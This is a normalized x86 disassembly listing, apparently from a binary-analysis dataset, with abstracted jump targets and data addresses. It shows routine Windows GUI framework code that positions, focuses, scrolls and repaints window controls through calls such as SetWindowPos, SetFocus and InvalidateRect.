mov dx [ esi + 0x4 ]
mov eax ebx
call sub_451944
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f688
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f5f4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_451944
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f6b4
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_44f6dc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_461dc8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_461cd0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403450
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44f6dc
test al al
jne r-xdata
sub_44f744
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f6dc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f764
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f6dc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f7a4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_461dc8
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403450
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44f7a4
test al al
jne r-xdata
sub_44f808
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f7a4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f828
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44d494
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_44b16c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44f828
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_44f8d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_44f828
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_461dc8
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_44b16c
test eax eax
jne r-xdata
sub_44f980
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e420
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f9a0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e420
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f9d4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e420
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44f9f4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_44fa44
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_44fa68
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_449284
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_44d4d0
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_44d494
mov dl [ esp ]
mov si 0xffd1
call sub_403450
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_44fac0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403450
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44fae4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403450
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44fb1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bc40
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_44d530
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_44dd40
sub_44fb54
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403450
pop esi
pop ebx
retn
mov eax ebx
call sub_44a5fc
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404464
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404464
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_44fbd4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e120
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44bd14
sub_44fc34
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44de94
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_44d290
pop ebx
retn
sub_44fc64
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_44fc8c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_450adc
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_44d290
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_44fcfc
push ebx
mov ebx eax
mov eax ebx
call sub_44bb80
mov eax ebx
call sub_450adc
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_44d530
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_4234bc
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_44b16c
sub_44fd38
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_448864
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_4507d8
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_44b16c
sub_44fd78
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_450adc
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4507d8
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44fdb8
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_44d530
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_450adc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_4506e0
sub_44fdf8
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_450918
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_450918
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_44fe58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_44abc8
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_449afc
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44e08c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_44fec8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bcb8
mov edx esi
mov eax ebx
call sub_44d4f0
pop esi
pop ebx
retn
sub_44fee4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_446ea0
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_461dc8
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403450
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403450
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403450
test al al
jne r-xdata
sub_44ff78
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_451944
mov edx esi
mov eax ebx
call sub_44fee4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44b16c
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_44b16c
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44b16c
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_461dc8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44b16c
test eax eax
jne r-xdata
jmp r-xdata
sub_45005c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_44b16c
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_4500b0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44b16c
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_461dc8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44b16c
test eax eax
jne r-xdata
sub_4500fc
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_44fee4
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44b16c
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_461dc8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44b16c
test eax eax
jne r-xdata
sub_450158
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_461dc8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44b16c
mov [ esi + 0xc ] eax
sub_45018c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_450adc
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_450adc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44960c
mov eax ebx
mov si 0xffd0
call sub_403450
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_449958
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_450264
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_44d4d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_44d494
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403450
inc edi
dec ebx
jne r-xdata
sub_4502ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d038
xor eax eax
push ebp
push sub_45034a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450264
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_449bd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450351
mov eax [ ebp - 0x4 ]
call sub_44d040
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_40651c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_40651c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_450358
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_44d060
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_44d494
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_450448
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_41a62c
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_41a4c0
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_41a64c
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_41a5d0
call sub_4507d8
jmp r-xdata
mov eax ebp
mov edx esi
call sub_41a5d0
call sub_4507d8
sub_450520
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_450448
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_450580
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4507d8
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_4507d8
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
test eax eax
jne r-xdata
sub_45061c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450adc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_44b16c
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
mov eax ebx
call sub_44d4d0
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_44d494
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_44d494
test [ eax + 0x52 ] 0x4
je r-xdata
sub_4506e0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_449958
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_450718
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_461dc8
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_450758
push ebx
mov ebx eax
mov eax ebx
call sub_461dc8
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_465c2c
pop ebx
retn
mov eax ebx
call sub_461df0
mov eax ebx
call sub_4507d8
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_450790
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4507b4
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_4507b4
sub_4507ec
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_41919c
mov eax edi
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_44d494
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_450880
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_4507d8
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_4508b8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_450adc
